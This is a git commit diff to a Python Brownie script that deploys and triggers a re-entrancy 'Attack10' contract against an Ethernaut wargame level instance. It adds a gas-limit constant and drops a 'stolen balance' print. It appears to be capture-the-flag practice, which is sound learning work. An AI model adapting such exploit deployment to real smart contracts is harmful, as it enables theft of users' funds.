f5a33afd21c3e59234121a2d97f28536aa5f90a8
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-22 10:49:18 +0100

    update 10-deploy_attack.py

--- scripts/10-deploy_attack.py
+++ scripts/10-deploy_attack.py
@@ -3,13 +3,13 @@ from brownie import web3, Attack10, interface
 
 ETHERNAUT_INSTANCE = "0xc734f6B53Ac3b11afdeE4cA1dbFee83521ED267d"
 AMOUNT = "0.01 ether"
+GAS_LIMIT = 6000000
 
 
 def main():
 
     player = get_account()
     target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)
-
     attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})
 
     # print(f"\nre-entrancy attack successfully deployed\n")
@@ -23,5 +23,4 @@ def main():
     # balance_ether = web3.fromWei(target.balance(), "ether")
     # print(f"\nBalance of the attack contract = {balance_ether}\n")
 
-    tx = attack.attack({"from": player, "gas_limit": 600000})
-    print(f"Stolen balance = {tx.balance()}")
+    tx = attack.attack({"from": player, "gas_limit": GAS_LIMIT})
